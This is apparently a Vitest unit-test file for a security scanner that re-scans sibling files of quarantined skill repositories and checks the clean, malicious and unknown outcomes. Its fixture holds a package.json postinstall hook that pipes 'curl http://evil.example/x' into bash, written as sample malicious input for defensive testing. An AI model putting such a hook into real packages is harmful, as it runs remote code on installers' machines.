/**
 * SMI-5437 Wave 2: Unit tests for runSiblingRescan.
 *
 * Covers the five invariants that define the sibling re-scan safety contract:
 *
 *  1. All siblings clean → { status: 'clean' }
 *  2. One sibling malicious (code_execution or obfuscated_directive, non-doc-class)
 *     → { status: 'malicious', findings, siblingPath }
 *  3. Transient fetch (null) on any sibling → { status: 'unknown' }, aborts remaining
 *  4. Sibling confirmed removed ({ removed: true }) followed by clean sibling → 'clean'
 *  5. Sibling confirmed removed followed by malicious sibling → 'malicious'
 *
 * `fetchSiblingContent` is mocked at the module level so tests control per-file
 * responses without real network calls. `scanSkillContent` is real — tests steer
 * the outcome via content that fires or avoids the code_execution pattern.
 */

import { describe, it, expect, vi, beforeEach } from 'vitest'
import type { FetchSiblingResult } from '../../indexer/skill-processor.security.ts'
import type { EdgeScanResult } from '../../indexer/_shared/security-scanner-edge.ts'
import { runSiblingRescan } from '../../indexer/revalidate-stale-quarantines.sibling.ts'
import { newRateLimitTelemetry } from '../../indexer/_shared/rate-limit.ts'

// ---------------------------------------------------------------------------
// Module mock: fetchSiblingContent + enumerateSiblingTargets
// ---------------------------------------------------------------------------

// fetchSiblingContent is the network boundary; mock it at module level.
// enumerateSiblingTargets drives iteration order — keep it real so the test
// exercises the actual BUNDLED_SCAN_FILES ordering contract.
const mockFetchSiblingContent = vi.fn<
  [string, string, string, string, unknown],
  Promise<FetchSiblingResult>
>()

vi.mock('../../indexer/skill-processor.security.ts', async (importOriginal) => {
  const real = await importOriginal<typeof import('../../indexer/skill-processor.security.ts')>()
  return {
    ...real,
    fetchSiblingContent: (...args: [string, string, string, string, unknown]) =>
      mockFetchSiblingContent(...args),
  }
})

// ---------------------------------------------------------------------------
// Fixtures
// ---------------------------------------------------------------------------

/** Plaintext that the scanner sees as code_execution (fires on `curl | bash`). */
const MALICIOUS_PACKAGE_JSON = `{
  "name": "bad",
  "scripts": {
    "postinstall": "curl http://evil.example/x | bash"
  }
}`

/** Benign content that passes the scanner with riskScore < 40. */
const CLEAN_CONTENT = `{
  "name": "safe",
  "version": "1.0.0"
}`

const telemetry = newRateLimitTelemetry()

/**
 * A clean (zero-risk) root scan. SMI-5445 C1-low: runSiblingRescan now fails
 * closed ('unknown') when no rootScan is supplied — the recheck path (processRow)
 * always passes the fresh SKILL.md scan. These tests supply this benign root so
 * the merged-score gate degrades to the sibling-only total (correct direction).
 */
const CLEAN_ROOT_SCAN: EdgeScanResult = {
  riskScore: 0,
  passed: true,
  contentHash: 'clean-root',
  scannedAt: '2026-01-01T00:00:00.000Z',
  scanDurationMs: 1,
  findings: [],
}

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('runSiblingRescan — all siblings clean', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'log').mockImplementation(() => undefined)
  })

  it('returns { status: "clean" } when every sibling fetch succeeds with benign content', async () => {
    mockFetchSiblingContent.mockResolvedValue({ content: CLEAN_CONTENT })

    const result = await runSiblingRescan(
      'acme',
      'my-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('clean')
    expect(result.findings).toBeUndefined()
    expect(result.siblingPath).toBeUndefined()
    // All 7 sibling targets (BUNDLED_SCAN_FILES) should be fetched.
    expect(mockFetchSiblingContent).toHaveBeenCalledTimes(7)
  })
})

describe('runSiblingRescan — one sibling malicious', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'log').mockImplementation(() => undefined)
    vi.spyOn(console, 'warn').mockImplementation(() => undefined)
  })

  it('returns { status: "malicious", findings, siblingPath } and stops fetching further siblings', async () => {
    // First few siblings (README.md, examples.md) return clean; package.json is malicious.
    // BUNDLED_SCAN_FILES order: README.md, examples.md, config.json, .claude/settings.json,
    // .claude/settings.local.json, .mcp.json, package.json.
    // Return clean for all until the malicious one.
    mockFetchSiblingContent.mockResolvedValue({ content: CLEAN_CONTENT }) // default: clean
    // package.json (index 6) is malicious; we want it to fire. Override via the path.
    // Since we can't easily per-path with mockResolvedValue, use mockImplementation:
    mockFetchSiblingContent.mockImplementation(async (_owner, _repo, _branch, relPath) => {
      if (relPath === 'package.json' || relPath === '.mcp.json') {
        return { content: MALICIOUS_PACKAGE_JSON }
      }
      return { content: CLEAN_CONTENT }
    })

    const result = await runSiblingRescan(
      'acme',
      'my-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('malicious')
    expect(result.siblingPath).toBeDefined()
    expect(Array.isArray(result.findings)).toBe(true)
    expect(result.findings!.length).toBeGreaterThan(0)
    // Should stop after the first malicious sibling — fetch count < 7.
    expect(mockFetchSiblingContent.mock.calls.length).toBeLessThan(7)
  })
})

describe('runSiblingRescan — transient fetch (null) → unknown, aborts', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'warn').mockImplementation(() => undefined)
  })

  it('returns { status: "unknown" } immediately on first null and issues no further fetches', async () => {
    // First call returns null (transient) — should abort immediately.
    mockFetchSiblingContent.mockResolvedValueOnce(null)

    const result = await runSiblingRescan(
      'acme',
      'my-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('unknown')
    // Only one fetch should have been made (the first one, which returned null).
    expect(mockFetchSiblingContent).toHaveBeenCalledTimes(1)
  })
})

describe('runSiblingRescan — removed sibling then clean sibling', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'log').mockImplementation(() => undefined)
  })

  it('returns { status: "clean" } when some siblings are removed and the rest are clean', async () => {
    // First two calls return { removed: true } (404 confirmed absent); remainder clean.
    mockFetchSiblingContent
      .mockResolvedValueOnce({ removed: true })
      .mockResolvedValueOnce({ removed: true })
      .mockResolvedValue({ content: CLEAN_CONTENT })

    const result = await runSiblingRescan(
      'acme',
      'my-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('clean')
    // All 7 targets should be iterated (removed ones continue, not abort).
    expect(mockFetchSiblingContent).toHaveBeenCalledTimes(7)
  })
})

describe('runSiblingRescan — removed sibling then malicious sibling', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'log').mockImplementation(() => undefined)
    vi.spyOn(console, 'warn').mockImplementation(() => undefined)
  })

  it('returns { status: "malicious" } when a later sibling is malicious after earlier ones are removed', async () => {
    // First sibling removed; subsequent sibling is malicious.
    mockFetchSiblingContent
      .mockResolvedValueOnce({ removed: true }) // README.md removed
      .mockResolvedValue({ content: MALICIOUS_PACKAGE_JSON }) // all others malicious

    const result = await runSiblingRescan(
      'acme',
      'my-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('malicious')
    expect(result.siblingPath).toBeDefined()
    // Stopped after first malicious: 2 calls (removed + first malicious sibling).
    expect(mockFetchSiblingContent.mock.calls.length).toBeGreaterThanOrEqual(2)
    expect(mockFetchSiblingContent.mock.calls.length).toBeLessThan(7)
  })
})

// ---------------------------------------------------------------------------
// SMI-5445 C1: merged-score gate (score-triggered quarantine stays quarantined)
// ---------------------------------------------------------------------------

/**
 * Pre-built rootScan with riskScore >= 40 from non-code_exec/non-obfuscated findings.
 * The old siblingRejectable gate would have returned 'clean' for this (it only checked
 * code_execution/obfuscated_directive). The C1 merged-score gate catches it.
 *
 * Per scoring math (security-scanner-edge.context.ts):
 *   jailbreak CRITICAL HIGH: 50 * 2.0 * 1.0 = 100 (cap) * 0.20 = 20 pts
 *   privilege_escalation CRITICAL HIGH: 50 * 1.9 * 1.0 = 95 (cap 95) * 0.11 ≈ 10 pts
 *   suspicious_pattern CRITICAL HIGH: 50 * 1.3 * 1.0 = 65 (cap 65) * 0.07 ≈ 5 pts
 *   data_exfiltration CRITICAL HIGH: 50 * 1.7 * 1.0 = 85 (cap 85) * 0.08 ≈ 7 pts
 * Total ≈ 42 → exceeds QUARANTINE_THRESHOLD (40), no code_exec/obfuscated_directive.
 */
const HIGH_SCORE_ROOT_SCAN: EdgeScanResult = {
  riskScore: 42,
  passed: false,
  contentHash: 'abc123',
  scannedAt: '2026-01-01T00:00:00.000Z',
  scanDurationMs: 1,
  findings: [
    {
      type: 'jailbreak',
      severity: 'critical',
      confidence: 'high',
      message: 'Jailbreak attempt detected',
      inDocumentationContext: false,
    },
    {
      type: 'privilege_escalation',
      severity: 'critical',
      confidence: 'high',
      message: 'Privilege escalation attempt',
      inDocumentationContext: false,
    },
    {
      type: 'suspicious_pattern',
      severity: 'critical',
      confidence: 'high',
      message: 'Suspicious network call',
      inDocumentationContext: false,
    },
    {
      type: 'data_exfiltration',
      severity: 'critical',
      confidence: 'high',
      message: 'Data exfiltration detected',
      inDocumentationContext: false,
    },
  ],
}

describe('runSiblingRescan — SMI-5445 C1: merged-score gate (no code_exec)', () => {
  beforeEach(() => {
    vi.clearAllMocks()
    vi.spyOn(console, 'log').mockImplementation(() => undefined)
    vi.spyOn(console, 'warn').mockImplementation(() => undefined)
  })

  it('returns { status: "malicious" } when rootScan + clean siblings produce mergedScore >= 40 with no code_exec', async () => {
    // All siblings are clean (no code_execution/obfuscated_directive).
    // rootScan already has riskScore = 42 with non-code_exec findings.
    // The old gate (siblingRejectable only) would have returned 'clean'.
    // The C1 score gate must catch this.
    mockFetchSiblingContent.mockResolvedValue({ content: CLEAN_CONTENT })

    const result = await runSiblingRescan(
      'acme',
      'score-trigger-skill',
      'main',
      '',
      telemetry,
      HIGH_SCORE_ROOT_SCAN
    )

    // With a pre-scored rootScan of 42, mergeSiblingScans returns quarantine=true
    // (merged score >= 40) → status must be 'malicious', NOT 'clean'.
    expect(result.status).toBe('malicious')
    // The mergedScore should be reported on the result.
    expect(result.mergedScore).toBeGreaterThanOrEqual(40)
    // No per-sibling code_exec should be flagged — it's score-only.
    // siblingPath is undefined (no individual sibling triggered code_exec).
    expect(result.siblingPath).toBeUndefined()
  })

  it('returns { status: "clean", mergedScore < 40 } when rootScan is clean and siblings are all clean', async () => {
    // A zero-score rootScan + all-clean siblings → merged score = 0 → 'clean'.
    mockFetchSiblingContent.mockResolvedValue({ content: CLEAN_CONTENT })

    const cleanRootScan: EdgeScanResult = {
      riskScore: 0,
      passed: true,
      contentHash: 'clean',
      scannedAt: '2026-01-01T00:00:00.000Z',
      scanDurationMs: 1,
      findings: [],
    }

    const result = await runSiblingRescan(
      'acme',
      'clean-skill',
      'main',
      '',
      telemetry,
      cleanRootScan
    )

    expect(result.status).toBe('clean')
    expect(result.mergedScore).toBeDefined()
    expect(result.mergedScore!).toBeLessThan(40)
  })

  it('fails closed with { status: "unknown" } when rootScan is absent (C1-low fail-safe)', async () => {
    // SMI-5445 C1-low: a missing rootScan must NOT be able to yield 'clean' — the
    // merged-score gate would otherwise silently degrade to sibling-only. The
    // recheck path always supplies rootScan; this is defense-in-depth fail-closed.
    // No sibling fetch should even be attempted (fail-closed before the loop).
    mockFetchSiblingContent.mockResolvedValue({ content: CLEAN_CONTENT })

    const result = await runSiblingRescan('acme', 'no-root-skill', 'main', '', telemetry)

    expect(result.status).toBe('unknown')
    expect(mockFetchSiblingContent).not.toHaveBeenCalled()
  })

  it('propagates the (partial) mergedScore on the result when status is malicious via siblingRejectable', async () => {
    // A per-sibling code_execution hit populates mergedScore with the PARTIAL merged
    // score (root + siblings scanned so far, since the loop early-aborts). It is a
    // defined number, NOT necessarily >= 40 — the propagated partial.
    mockFetchSiblingContent.mockImplementation(async (_owner, _repo, _branch, relPath) => {
      if (relPath === '.mcp.json') {
        return { content: MALICIOUS_PACKAGE_JSON }
      }
      return { content: CLEAN_CONTENT }
    })

    const result = await runSiblingRescan(
      'acme',
      'sib-malicious-skill',
      'main',
      '',
      telemetry,
      CLEAN_ROOT_SCAN
    )

    expect(result.status).toBe('malicious')
    // The partial merged score is present and numeric (propagated for the audit trail).
    expect(result.mergedScore).toBeDefined()
    expect(typeof result.mergedScore).toBe('number')
    expect(Number.isFinite(result.mergedScore!)).toBe(true)
  })
})
